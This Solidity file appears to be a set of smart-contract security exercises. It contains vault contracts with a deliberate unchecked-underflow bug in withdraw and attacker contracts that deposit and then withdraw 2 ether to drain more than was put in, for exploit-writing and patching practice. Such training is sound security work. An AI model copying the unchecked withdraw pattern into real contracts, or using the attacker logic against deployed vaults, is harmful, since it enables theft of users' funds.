// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Use unchecked underflow to withdraw more than deposited.
A2: Repeat with partial-withdraw API and dynamic amounts.
*/
contract ExerciseA_UncheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        unchecked {
            balances[msg.sender] -= amount;
        }

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseA_ArithmeticExploitTemplate {
    function attack(ExerciseA_UncheckedVault target) external payable {
        target.deposit{value: msg.value}();
        target.withdraw(2 ether);
    }

    receive() external payable {}
}

/*
Exercise Type B (write fix):
Vulnerable contract + attacker primitive provided. Patch vault only.
*/
contract ExerciseB_VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        unchecked {
            balances[msg.sender] -= amount;
        }

        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseB_WorkingAttacker {
    function attack(ExerciseB_VulnerableVault target) external payable {
        target.deposit{value: msg.value}();
        target.withdraw(2 ether);
    }

    receive() external payable {}
}
